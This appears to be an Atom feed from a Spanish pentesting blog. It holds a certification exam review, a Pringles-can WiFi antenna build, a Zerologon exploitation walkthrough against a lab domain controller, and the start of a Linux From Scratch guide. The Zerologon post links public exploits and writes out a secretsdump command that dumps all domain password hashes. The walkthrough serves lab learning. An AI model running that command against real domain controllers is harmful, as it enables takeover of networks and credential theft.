<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-08-04T13:22:42-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">J0hnT | Blog</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>J0hnTena</name></author><entry><title type="html">Mi experiencia con la certificación eWPTxv2</title><link href="http://localhost:4000/experiencia-eWPTx/" rel="alternate" type="text/html" title="Mi experiencia con la certificación eWPTxv2" /><published>2023-10-14T00:00:00-06:00</published><updated>2023-10-14T00:00:00-06:00</updated><id>http://localhost:4000/experiencia-eWPTx</id><content type="html" xml:base="http://localhost:4000/experiencia-eWPTx/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/eWPTxv2/eWPTxv2.jpeg&quot;&gt;
&lt;/p&gt;

## Certificación eWPTxv2

### Mi experiencia personal

Ya era hora de redactar este artículo... entre tantas cosas en las que ando metido no he podido sacar un rato para comentaros mi experiencia con esta certificación. Ahora que estoy algo menos ajetreado en esta noche de inspiración... vamos a analizar qué es lo que está pasando aquí. 

La certificación **eWPTXv2**, ¿merece la pena?, pues mi respuesta es un 'si'. La verdad es que ha sido una certificación desafiante, sobre todo a la hora de hacer el examen, porque me encontré con más cosas de las que me pensaba que habrían y la verdad es que hubo un puro mixto de vulnerabilidades a explotar. 

Para que tengáis una idea de cosillas que llegué a explotar, pues hubieron desde inyecciones SQL, hasta ataques Blind XXE, ataques de deserialización combinados con vulnerabilidades de tipo SSRF para conseguir RCE, ataques XSS, Object Serialization y otras muchas cosas más. 

La dinámica del examen es algo distinta a la que tiene por ejemplo Offensive Security, me refiero, en vez de ponerte una serie de objetivos acompañados con un Score para saber en todo momento si llegas a la nota para aprobar o no, esto es más a lo... 'Tú encuentra todo lo que puedas, que ya luego nosotros revisamos el informe final y en base a lo que hayas encontrado decidimos'.

### ¿Qué me pareció el laboratorio?

Respecto al laboratorio, he de deciros que no puedo comentar nada al respecto, me hubiera gustado probarlo... pero quise aprovechar un cupón que salió en el mes de Septiembre para el Voucher, donde se te quedaba el precio a 300 euros... por lo que decidí ir directo al examen. Ir directo al examen supone que no te entregan documentación ni nada por el estilo, porque estás pagando únicamente para hacer el examen. 

Fue algo arriesgado probar a examinarse sin tener previo material, pero oye... si la jugada salía bien, pues chimpún y pa' dentro, de lo contrario en el peor de los casos pues ya pagaba el curso más adelante y le metía más caña, ¡pero el que no arriesga no gana!.

### ¿Es difícil la certificación?

Para aquel o aquella que tenga planteado examinarse de esta certificación, recomiendo de antes tener buenas bases previas sobre pentesting web (ojo, hablo sobre todo si pretendes ir directo al examen). Recomiendo haber teniendo experiencia y manejo al menos sobre los siguientes tipos de vulnerabilidades:

* Inyecciones SQL (Manuales)
* Xml External Entity Injections XXE (Incluido Blind XXE)
* Server-Side Request Forgery (SSRF)
* Cross-Site Request Forgery (CSRF)
* Java Deserialization Attacks (Y otros tipos de ataques de deserialización)
* Template Injections
* Cross-Site Scripting (XSS)  [Todos los tipos]
* Authorization Bypass
* Padding Oracle Attack
* Local File Inclusion (LFI)
* Remote File Inclusion (RFI)
* Type Juggling

Entre otras muchas más que probablemente me esté dejando en el tintero, pero por lo menos las fundamentales que son con las que más frecuencia trataréis. También recomiendo tener cierto dominio y control sobre los lenguajes Python y PHP, pues en ocasiones os vais a tener que crear vuestras propias utilidades para explotar ciertas vulnerabilidades.

Con tener dominio de estos lenguajes, me refiero no sólo a nivel de programación, sino también a nivel de entender qué puede estar haciendo un código por detrás... tratando de reversearlo o aprovechar el mismo para computar ciertas cosas (Si doy más pistas es Spoiler, así que preferible dejarlo en el aire xD).

### ¿Cómo es el examen?

La idea del examen es la siguiente, te dan un acceso por VPN y te piden que efectúes un análisis de vulnerabilidades sobre un dominio que cuenta con tres subdominios. El análisis de vulnerabilidades comprende no sólo la identificación de las vulnerabilidades, sino también la explotación de las mismas.

Aislado a todo lo que encuentres, sí que es cierto que hay una serie de requisitos que tienes que cumplir para lograr aprobar el examen, aunque lo indican como &quot;Los requisitos necesarios pero no suficientes para aprobar...&quot;. 

Estos son:

* Leer cierto archivo alojado en una ruta interna del sistema.
* Conseguir ejecución remota de comandos mediante la explotación de dos servicios que corren en la máquina, accesibles desde el servidor web.

Si consigues estos objetivos y encima encuentras un buen puñado de vulnerabilidades extra, yo diría que ya te puedes quedar tranquilo/a. Recordad que no hay puntuación, no hay una nota en si que podáis calcular para saber más o menos el Score que podáis estar sacando, la idea es más bien encontrar todo lo que puedas.

Bajo mi experiencia, he de decir que llegué a explotar algunas vulnerabilidades que me parecieron flipantes, en el sentido de que igual me esperaba que las vulnerabilidades a explotar iban a ser algo más sencillas, pero en absoluto... hay alguna que otra que te puede hacer perder bastante tiempo, sobre todo una que llevaré siempre conmigo en el corazón con la que estuve casi un día entero para sacarla (mucha metodología de prueba/error).

### ¿Cuánto dura el examen?

El examen dura un total de siete días. En mi caso necesité cuatro días para encontrar todas las vulnerabilidades que pude y un día para generar el informe final. Efectivamente chavales, lo que tanto nos gusta a todos, una vez finalizas es necesario detallar todo lo encontrado a través de un reporte técnico y ejecutivo, incorporando las capturas de pantalla necesarias y las pruebas de concepto de todo lo que hayas hecho.

Aislado al examen, la fase de documentación son otros siete días aparte, pero bueno en ese aspecto fui bastante rápido porque ya había estado previamente trabajando en una plantilla hecha en LaTeX para ir a tiro hecho (igual que en el OSCP), así que la documentación fue lo que menos me llevó. En conclusión, contando con los días para la examinación y la creación del reporte final, el examen son unos catorce días, pero una vez finalizados los siete primeros días del examen, te cortan la conexión por VPN.

### ¿Qué toca ahora?

He estado pensando en hacer el AWAE (OSWE) de Offensive Security, así en caso de sacarla os puedo comentar diferencias con respecto a la certificación eWPTXv2, porque por el momento no puedo hacer distinción.

Como siempre, en paralelo seguiré subiendo vídeos al canal de YouTube y generando todo el contenido que pueda para vosotros.

¡A cuidarse!</content><author><name>J0hnTena</name></author><category term="Pentesting" /><category term="eWPTXv2" /><category term="Web Exploiting" /><category term="Web Penetration Testing" /><category term="Examen" /><summary type="html">Recientemente me he sacado la certificación eWPTxv2, ¿qué tan difícil es?, ¿merece la pena pagar por esta certificación?</summary></entry><entry><title type="html">Creando una antena casera direccional de largo alcance</title><link href="http://localhost:4000/antena-casera-largo-alcance/" rel="alternate" type="text/html" title="Creando una antena casera direccional de largo alcance" /><published>2022-11-29T00:00:00-06:00</published><updated>2022-11-29T00:00:00-06:00</updated><id>http://localhost:4000/antena-casera-largo-alcance</id><content type="html" xml:base="http://localhost:4000/antena-casera-largo-alcance/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/blog/assets/images/antenacasera/portada-antena.jpg&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;cómo-crear-una-antena-casera-de-largo-alcance&quot;&gt;¿Cómo crear una antena casera de largo alcance?&lt;/h2&gt;

&lt;p&gt;Hoy aprenderás a crear una antena casera para que tu nivel de Hack llegue a distancias inimaginables.&lt;/p&gt;

&lt;p&gt;Empecemos por el principio, ¿por qué elementos está compuesta la antena?&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/antenacasera/antena.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Parecerá una broma, pero no… es una lata de Pringles. Estas latas pueden convertirse en antenas WiFi caseras direccionales, otorgándonos la capacidad de recibir señales inalámbricas de aquellas redes que se encuentren bastante lejos.&lt;/p&gt;

&lt;p&gt;Algunos de los componentes que vamos a estar comentando los podrás conseguir en la ferretería más cercana o de confianza. Esto es simplemente acercaros a la persona que os atienda y le comentáis que queréis estar Hack… ya con esto, sabrá a qué habéis venido y lo que estáis buscando.&lt;/p&gt;

&lt;p&gt;El primer paso que debes seguir es colocar la lata vacía de Pringles sobre una mesa y medir la longitud de la misma con una cinta métrica. Marca un punto sobre su punto medio, con un permanente o con lo que consideres (mientras lo veas)… ya que en caso de usar un trípode tendrás que engancharlo en este punto para equilibrar el peso y lograr estabilidad, resultando más sencillo maniobrar con nuestro experimento.&lt;/p&gt;

&lt;p&gt;¿Qué hay dentro de la lata?, vamos a echarle un ojo:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/antenacasera/interior-lata1.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Os lo muestro también con la parte superior destapada para los/as curiosos/as:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/antenacasera/interior-lata2.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Como se puede apreciar, necesitaréis de una varilla roscada de 140 mm de longitud y 3 mm de grosor. Lo más probable es que también necesitéis 5 arandelas (una de ellas en la imagen no se aprecia porque estaría por el otro lado de la lata, la cual sustenta toda la base de la antena bajo presión acompañándola de una tuerca).&lt;/p&gt;

&lt;p&gt;Si hacemos cálculos, tuercas en total… necesitarías 8 (sin contar con la que está por el otro lado).&lt;/p&gt;

&lt;p&gt;El conjunto de arandelas con la varilla, facilita la recepción de las ondas de frecuencia WiFi (2.4 GHZ) en el interior del tubo, el cual es de papel de aluminio, reflejando así en el culo del bote la señal y amplificando en consecuencia la misma sobre la llave USB WiFi:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/antenacasera/medidasexactas.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;A la hora de montar las tuercas y arandelas, debéis ser meticulosos con las medidas entre arandelas grandes… pues conseguiremos así que la onda realice la parábola lo mejor posible:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/antenacasera/medidas.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Una vez con todo esto montado, obviamente… necesitamos de un sistema de sujeción.&lt;/p&gt;

&lt;p&gt;Por un lado, deberemos sujetar el final de la antena. Para ello, mediante un hueco en la tapa de la lata, pasaremos un clavo en el centro. Dicho extremo de la sujeción atrapará el clavo por dentro de la lata, pudiendo así cerrarla y dejando el interior terminado.&lt;/p&gt;

&lt;p&gt;Por otro lado, en cuanto al exterior… mediante otro sistema de agarre, sostendremos el clavo por fuera, enganchando el mismo a un cable coaxial por el centro:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/antenacasera/enganche.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Desde que ya tengamos todo esto conectado, el extremo del cable coaxial tan sólo lo tendremos que enganchar a nuestro conector USB WiFi:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/antenacasera/conexionfinal.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;En la imagen adjunta, el recepetor de señales tiene la propia antena que viene por defecto puesta… pero es en este punto cuando se la quitaremos y la conectaremos a la antena formada por el bote de Pringles.&lt;/p&gt;

&lt;p&gt;Finalmente, la antena quedaría de la siguiente forma:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/antenacasera/hack.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;De manera casi inmediata, notaremos que el nivel de Hack habrá aumentado y ya estaremos preparados para ver una gran cantidad de redes WiFi en el entorno.&lt;/p&gt;</content><author><name>J0hnTena</name></author><category term="Pentesting" /><category term="OSWP" /><category term="Antena Casera" /><summary type="html">¿Te gustaría aprender a crear una antena casera de largo alcance para hackearlos a todos?, toma asiento que te lo explico.</summary></entry><entry><title type="html">Cómo explotar la vulnerabilidad Zerologon</title><link href="http://localhost:4000/como-explotar-vulnerabilidad-zerologon/" rel="alternate" type="text/html" title="Cómo explotar la vulnerabilidad Zerologon" /><published>2020-09-16T00:00:00-05:00</published><updated>2020-09-16T00:00:00-05:00</updated><id>http://localhost:4000/como-explotar-vulnerabilidad-zerologon</id><content type="html" xml:base="http://localhost:4000/como-explotar-vulnerabilidad-zerologon/">![](/assets/images/zerologon/zerologon.png)

## ¿Es realmente crítico Zerologon?

La respuesta es un **si** rotundo. No creo que haga falta a estas alturas comentar qué es Zerologon... ya existen montón de artículos a disposición detallando de forma técnica y ejecutiva en qué consiste la vulnerabilidad.

Centrémonos en la explotación, ¿cómo se explota zerologon?, vamos a ello. En mi caso comenzaré haciendo uso de la siguiente utilidad:

* [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)

Este recurso, nos permitirá a través del script `zerologon_tester.py`, saber si el DC en cuestión es vulnerable ante el ataque. Yo ya dispongo de un DC virtualizado contra el que lanzar el tester, en caso de no contar con uno, te recomiendo hacer uso de la utilidad '**AD-AutomationLab**', una herramienta en PowerShell que desarrollé para el despliegue automatizado de un Domain Controller entre otras cosas (también es capaz de configurar vulnerabilidades reconocidas sobre el servidor).

Por aquí os dejo el enlace para aquellos/as que lo quieran usar:

* [https://github.com/s4vitar/AD-AutomationLab](https://github.com/s4vitar/AD-AutomationLab)


## ¿Cómo se explota la vulnerabilidad Zerologon?

Una vez tengamos ya el Domain Controller operando, podremos empezar. La dirección IP de mi DC en este caso es la `192.168.101.130`, y la dirección IP de mi equipo atacante la `192.168.101.128`.

Partiendo de este punto, estos son los resultados obtenidos al lanzar el tester sobre el DC:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/zerologon/1.png&quot;&gt;
&lt;/p&gt;

Toda la información referente al nombre de equipo, dominio y demás puede obtenerse rápidamente desde CrackMapExec con un simple escaneo por Samba:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/zerologon/2.png&quot;&gt;
&lt;/p&gt;

En base a los resultados de la primera foto, vemos que el DC es vulnerable. Lo único que nos queda por tanto es explotar la vulnerabilidad.

En esta ocasión, estaré usando el siguiente recurso de la plataforma de GitHub:

* [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

Esta utilidad cuenta con un script de nombre `cve-2020-1472-exploit.py`, el cual como información nos solicita el nombre del equipo y la dirección IP de la máquina víctima.

Antes de explotar la vulnerabilidad, para evitar problemas con Impacket, recomiendo tirar de `virtualenv` para tras su instalación ejecutar posteriormente la herramienta. Sería seguir básicamente los siguientes pasos:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #virtualenv zerologon
created virtual environment CPython3.8.2.final.0-64 in 178ms
  creator CPython3Posix(dest=/home/s4vitar/Desktop/zerologon, clear=False, global=False)
  seeder FromAppData(download=False, CacheControl=latest, appdirs=latest, certifi=latest, chardet=latest, colorama=latest, contextlib2=latest, distlib=latest, distro=latest, html5lib=latest, idna=latest, ipaddr=latest, lockfile=latest, msgpack=latest, packaging=latest, pep517=latest, pip=latest, pkg_resources=latest, progress=latest, pyparsing=latest, pytoml=latest, requests=latest, retrying=latest, setuptools=latest, six=latest, urllib3=latest, webencodings=latest, wheel=latest, via=copy, app_data_dir=/root/.local/share/virtualenv/seed-app-data/v1.0.1.debian)
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #source zerologon/bin/activate
(zerologon) ┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #cd /opt/
(zerologon) ┌─[root@parrot]─[/opt]
└──╼ #git clone https://github.com/SecureAuthCorp/impacket
Clonando en 'impacket'...
remote: Enumerating objects: 39, done.
remote: Counting objects: 100% (39/39), done.
remote: Compressing objects: 100% (26/26), done.
remote: Total 18517 (delta 19), reused 26 (delta 13), pack-reused 18478
Recibiendo objetos: 100% (18517/18517), 6.17 MiB | 5.96 MiB/s, listo.
Resolviendo deltas: 100% (14103/14103), listo.
(zerologon) ┌─[root@parrot]─[/opt]
└──╼ #cd impacket/
(zerologon) ┌─[root@parrot]─[/opt/impacket]
└──╼ #python3 setup.py install

...

```

Una vez hecho, la ejecución del exploit debe devolver un output como este en caso de éxito:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/zerologon/3.png&quot;&gt;
&lt;/p&gt;

Si esto es así, ya todo lo demás está hecho. Lo único que tendríamos que hacer, tal y como nos indica el README del siguiente recurso:

* [https://github.com/risksense/zerologon](https://github.com/risksense/zerologon)

Sería ejecutar la siguiente sentencia:

```bash
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
```

Para mi caso quedaría de la siguiente forma:

```bash
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 's4vicorp/DC-Company$@192.168.101.130'
```

Obteniendo los siguientes resultados tras su ejecución:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/zerologon/4.png&quot;&gt;
&lt;/p&gt;

Conseguimos listar los hashes de todos los usuarios existentes a nivel de dominio, incluido aquellos que sean administradores del dominio. Básicamente el mismo efecto que obtendríamos si desde CrackMapExec hubiéramos hecho uso de la acción `--ntds vss`, pero claro... en ese caso habríamos necesitado credenciales válidas, lo bueno del Zerologon es que no hace falta nada de eso :)</content><author><name>J0hnTena</name></author><category term="Pentesting" /><category term="Herramientas" /><category term="Windows" /><category term="Linux" /><category term="Domain Controller" /><category term="Guías" /><category term="Privilege Escalation" /><summary type="html">Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero... ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.</summary></entry><entry><title type="html">Cómo construir tu propio sistema Linux</title><link href="http://localhost:4000/como-crear-un-sistema-linux/" rel="alternate" type="text/html" title="Cómo construir tu propio sistema Linux" /><published>2020-04-23T00:00:00-05:00</published><updated>2020-04-23T00:00:00-05:00</updated><id>http://localhost:4000/como-crear-un-sistema-linux</id><content type="html" xml:base="http://localhost:4000/como-crear-un-sistema-linux/"># Cómo construir tu propio sistema Linux (S4viOS)

![Portada OS](https://wallpaperaccess.com/full/981849.png)

Antes que nada, deciros que toda esta guía la tenéis también disponible en mi Gist, desde donde os podéis dirigir directamente a través del índice a la sección que queráis:

* [https://gist.github.com/s4vitar/8a2b18ec1f1b16226e21d4b89cbef270](https://gist.github.com/s4vitar/8a2b18ec1f1b16226e21d4b89cbef270)

Por alguna razón los eventos clickeables del índice desde esta página no son funcionales, así que cualquier cosa os podréis manejar por allí más cómodamente (No te olvides de dejar un Fav :P).

## Índice y Estructura Principal
- [Antecedentes](#Antecedentes)
- [Prerrequisitos](#Prerrequisitos)
- [Introducción](#Introducción)
     * [Consideraciones](#Consideraciones)
     * [Instalando Debian 10.3.0](#Instalando-Debian-10.3.0)
     * [Configurando el Debian base](#Configurando-el-Debian-base)
     * [Instalación de paquetes base](#instalación-de-paquetes-base)
          * [Bash 3.2](#bash)
          * [Binutils 2.25](#Binutils)
          * [Bison 2.7](#Bison)
          * [Bzip2 1.0.4](#Bzip2)
          * [Coreutils 6.9](#Coreutils)
          * [Diffutils 2.8.1](#Diffutils)
          * [Findutils 4.2.31](#Findutils)
          * [Gawk 4.0.1](#Gawk)
          * [GCC 6.2](#gcc)
          * [Glibc 2.11](#glibc)
          * [Grep 2.5.1](#Grep)
          * [Gzip 1.3.12](#Gzip)
          * [M4 1.4.10](#M4)
          * [Make 4.0](#Make)
          * [Patch 2.5.4](#Patch)
          * [Perl 5.8.8](#Perl)
          * [Python 3.4](#Python)
          * [Sed 4.1.5](#Sed)
          * [Tar 1.22](#Tar)
          * [Texinfo 4.7](#Texinfo)
          * [Xz 5.0.0](#Xz)
     * [Version Check](#version-check)
- [Creando nueva partición](#creando-nueva-partición)
     * [Estructurando la partición con parted](#Estructurando-la-partición-con-parted)
- [Descarga de paquetes para la creación del sistema base](#Descarga-de-paquetes-para-la-creación-del-sistema-base)
- [Construyendo un sistema temporal](#Construyendo-un-sistema-temporal)
     * [Creación de un nuevo usuario](#Creación-de-un-nuevo-usuario)
     * [Compilación de paquetes](#Compilación-de-paquetes)
          * [Compilación binutils](#Compilación-binutils)
          * [Compilación GCC](#Compilación-GCC)
          * [Compilación API Headers](#Compilación-API-Headers)
          * [Compilación Glibc](#Compilación-Glibc)
          * [Compilación Libstdc++ de GCC](#Compilación-Libstdc-de-GCC)
          * [Compilación Binutils Fase 2](#Compilación-Binutils-Fase-2)
          * [Compilación GCC Fase 2](#Compilación-GCC-Fase-2)
          * [Compilación Tcl](#Compilación-Tcl)
          * [Compilación Expect](#Compilación-Expect)
          * [Compilación DejaGNU](#Compilación-DejaGNU)
          * [Compilación M4](#Compilación-M4)
          * [Compilación Ncurses](#Compilación-Ncurses)
          * [Compilación Bash](#Compilación-Bash)
          * [Compilación Bison](#Compilación-Bison)
          * [Compilación Bzip2](#Compilación-Bzip2)
          * [Compilación Coreutils](#Compilación-Coreutils)
          * [Compilación Diffutils](#Compilación-Diffutils)
          * [Compilación File](#Compilación-File)
          * [Compilación Findutils](#Compilación-Findutils)
          * [Compilación Gawk](#Compilación-Gawk)
          * [Compilación Gettext](#Compilación-Gettext)
          * [Compilación Grep](#Compilación-Grep)
          * [Compilación Gzip](#Compilación-Gzip)
          * [Compilación Make](#Compilación-Make)
          * [Compilación Patch](#Compilación-Patch)
          * [Compilación Perl](#Compilación-Perl)
          * [Compilación Python](#Compilación-Python)
          * [Compilación Sed](#Compilación-Sed)
          * [Compilación Tar](#Compilación-Tar)
          * [Compilación Texinfo](#Compilación-Texinfo)
          * [Compilación Xz](#Compilación-Xz)
     * [Stripping](#Stripping)
     * [Cambio de propietario](#Cambio-de-propietario)
- [Construyendo el sistema LFS](#Contruyendo-el-sistema-LFS)
     * [Preparando el sistema de archivos del kernel virtual](#Preparando-el-sistema-de-archivos-del-kernel-virtual)
     * [Montaje del sistema de archivos del kernel virtual](#Montaje-del-sistema-de-archivos-del-kernel-virtual)
     * [Entrando en el entorno Chroot](#Entrando-en-el-entorno-Chroot)
          * [Creación de directorios](#Creación-de-directorios)
          * [Creación de archivos esenciales y Links Simbólicos](#Creación-de-archivos-esenciales-y-links-simbólicos)
     * [Instalación del Software básico del sistema](#Instalación-del-Software-básico-del-sistema)
          * [API Headers en LFS](#API-Headers-en-LFS)
          * [Man pages en LFS](#Man-pages-en-LFS)
          * [Glibc en LFS](#Glibc-en-LFS)
          * [Ajuste de la Toolchain](#Ajuste-de-la-Toolchain)
          * [Zlib en LFS](#Zlib-en-LFS)
          * [Bzip2 en LFS](#Bzip2-en-LFS)
          * [Xz en LFS](#Xz-en-LFS)
          * [File en LFS](#File-en-LFS)
          * [Readline en LFS](#Readline-en-LFS)
          * [M4 en LFS](#M4-en-LFS)
          * [Bc en LFS](#Bc-en-LFS)
          * [Binutils en LFS](#Binutils-en-LFS)
          * [GMP en LFS](#GMP-en-LFS)
          * [MPFR en LFS](#MPFR-en-LFS)
          * [MPC en LFS](#MPC-en-LFS)
          * [Attr en LFS](#Attr-en-LFS)
          * [Acl en LFS](#Acl-en-LFS)
          * [Instalación del Shadow](#Instalación-del-Shadow)
          * [GCC en LFS](#GCC-en-LFS)
          * [Pk-config en LFS](#Pk-config-en-LFS)
          * [Ncurses en LFS](#Ncurses-en-LFS)
          * [Sed en LFS](#Sed-en-LFS)
          * [Psmisc en LFS](#Psmisc-en-LFS)
          * [Iana Etc en LFS](#Iana-Etc-en-LFS)
          * [Bison en LFS](#Bison-en-LFS)
          * [Flex en LFS](#Flex-en-LFS)
          * [Grep en LFS](#Grep-en-LFS)
          * [Bash en LFS](#Bash-en-LFS)
          * [Libtool en LFS](#Libtool-en-LFS)
          * [GDBM en LFS](#GDBM-en-LFS)
          * [Gperf en LFS](#Gperf-en-LFS)
          * [Expat en LFS](#Expat-en-LFS)
          * [Inetutils en LFS](#Inetutils-en-LFS)
          * [Perl en LFS](#Perl-en-LFS)
          * [XML::Parser en LFS](#XML-Parser-en-LFS)
          * [Intltool en LFS](#Intltool-en-LFS)
          * [Autoconf en LFS](#Autoconf-en-LFS)
          * [Automake en LFS](#Automake-en-LFS)
          * [Kmod en LFS](#Kmod-en-LFS)
          * [Gettext en LFS](#Gettext-en-LFS)
          * [Libelf de Elfutils en LFS](#Libelf-de-elfutils-en-LFS)
          * [Libffi en LFS](#Libffi-en-LFS)
          * [Openssl en LFS](#Openssl-en-LFS)
          * [Python3 en LFS](#Python3-en-LFS)
          * [Ninja en LFS](#Ninja-en-LFS)
          * [Meson en LFS](#Meson-en-LFS)
          * [Coreutils en LFS](#Coreutils-en-LFS)
          * [Check en LFS](#Check-en-LFS)
          * [Diffutils en LFS](#Diffutils-en-LFS)
          * [Gawk en LFS](#Gawk-en-LFS)
          * [Findutils en LFS](#Findutils-en-LFS)
          * [Groff en LFS](#Groff-en-LFS)
          * [GRUB en LFS](#GRUB-en-LFS)
          * [Less en LFS](#Less-en-LFS)
          * [Gzip en LFS](#Gzip-en-LFS)
          * [Zstd en LFS](#Zstd-en-LFS)
          * [IPRoute en LFS](#IPRoute-en-LFS)
          * [Kbd en LFS](#Kbd-en-LFS)
          * [Libpipeline en LFS](#Libpipeline-en-LFS)
          * [Make en LFS](#Make-en-LFS)
          * [Patch en LFS](#Patch-en-LFS)
          * [Man DB en LFS](#Man-DB-en-LFS)
          * [Tar en LFS](#Tar-en-LFS)
          * [Texinfo en LFS](#Texinfo-en-LFS)
          * [Vim en LFS](#Vim-en-LFS)
          * [Procps-ng en LFS](#Procps-en-LFS)
          * [Util-Linux en LFS](#Util-Linux-en-LFS)
          * [E2fsprogs en LFS](#E2fsprogs-en-LFS)
          * [Sysklogd en LFS](#Sysklogd-en-LFS)
          * [Sysvinit en LFS](#Sysvinit-en-LFS)
          * [Eudev en LFS](#Eudev-en-LFS)
     * [Limpieza Final](#Limpieza-Final)
     * [Configuración del sistema](#Configuración-del-sistema)
          * [Instalación de LFS Bootscripts](#Instalación-de-LFS-Bootscripts)
          * [Gestión de dispositivos](#Gestión-de-dispositivos)
          * [Creación de archivos de configuración de interfaz de red](#Creación-de-archivos-de-configuración-de-interfaz-de-red)
          * [Configurando el nombre de host del sistema](#Configurando-el-nombre-de-host-del-sistema)
          * [Configurando el Sysvinit](#Configurando-el-sysvinit)
          * [Configuración del reloj del sistema](#Configuración-del-reloj-del-sistema)
          * [Configuración de la consola de Linux](#Configuración-de-la-consola-de-linux)
          * [Creando archivo rc.site](#Creando-archivo-rc-site)
     * [Archivos de inicio de Bash Shell](#Archivos-de-inicio-de-Bash-Shell)
- [Haciendo nuestro sistema Booteable](#Haciendo-nuestro-sistema-booteable)
     * [Creando archivo fstab](#Creando-archivo-fstab)
     * [Instalación del Kernel](#Instalación-del-kernel)
     * [Uso del GRUB para configurar el proceso de arranque](#Uso-del-grub-para-configurar-el-proceso-de-arranque)     
- [Creando archivos finales](#Creando-archivos-finales)
- [Arrancando nuestra nueva distribución Linux S4viOS](#Arrancando-nuestra-nueva-distribución-Linux-S4viOS)

Antecedentes
===============================================================================================================================
Antes que nada, me gustaría comentar una serie de puntos para aquellos que pretenden seguir esta guía.

#### ¿Por qué crear un sistema Linux desde 0 manualmente en vez de descargar e instalar uno existente?

Bueno, si te estás haciendo esta pregunta es que lo tuyo no es la curiosidad. 

La idea de esta guía es que te sirva de ayuda para entender y aprender cómo funciona un sistema Linux desde adentro hacia afuera. Construir un sistema LFS desde 0 te ayuda a entender qué hace que Linux funcione y cómo las cosas funcionan a bajo nivel. 

Aparte, una de las mejores cosas que se pueden sacar de provecho de todo esto es la capacidad de personalizar un sistema Linux para satisfacer tus propias necesidades únicas. No me considero un paranoico, pero en muchas distribuciones Linux no es la primera vez que me encuentro con un binario ya previamente compilado cuyo código no puedo ver (por no ser Open Source)... y a saber qué lleva dentro, igual hasta viene con regalo. 

En ese sentido, tal vez por pura prevención (y curiosidad), a veces es mejor tener el control de qué cosas son las que se están instalando en el sistema, ¿no crees?.

#### Prerrequisitos

Construir un sistema LFS no es una tarea simple. Para toda esta guía, se requiere un cierto nivel de conocimiento existente sobre la administración del sistema Unix. Si esto es así y se aplica para tu caso... a por ello.

Otro de los requisitos que se requieren es la **paciencia**. Construir un sistema LFS no se hace en un día (creedme, lo he intentado), algunos paquetes tardan mucho en instalarse y hay algunas fases que de por sí requieren de tiempo. 

El tiempo estimado para construir tu propio sistema Linux oscila entre **3 y 5 días**, para que lo tengáis en cuenta.

INTRODUCCIÓN
===============================================================================================================================
#### Consideraciones

Bueno antes de empezar, deciros que en mi caso voy a estar trabajando con VirtualBox. 

La pregunta que probablemente os hagáis es, ¿y no puedo usar VMware?, pues a ver, por poder podéis... PERO de las veces que he probado con VMware, justo en la fase final a la hora de hacer el Reboot... aparece un **Kernel Panic**, con el cual me estuve peleando en su momento y no encontré forma de arreglarlo. 

Si queréis no tener que estar lidiando con estos problemas, mi recomendación es que lo hagáis todo con **Virtual Box**. Por lo demás, hay que tener en cuenta que para construir tu propio sistema Linux, necesitas primero de una distribución Linux de base sobre la que trabajar, ya que es desde esta desde donde estaremos toqueteando nuestro nuevo disco duro virtual que posteriormente crearemos.

En mi caso, estaré trabajando con un **Debian 10.3.0 amd64**, el cual puedes descargar desde la página oficial:

* https://www.debian.org/distrib/netinst

#### Instalando Debian 10.3.0

Una vez descargado el ISO, lo único que tendremos que hacer es lo siguiente.

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346m7.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Es decir, comenzamos creando una nueva máquina virtual. Posteriormente, le asignamos un nombre e indicamos el tipo de sistema operativo con el que estamos tratando así como la versión:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346mT.png&quot;&gt;
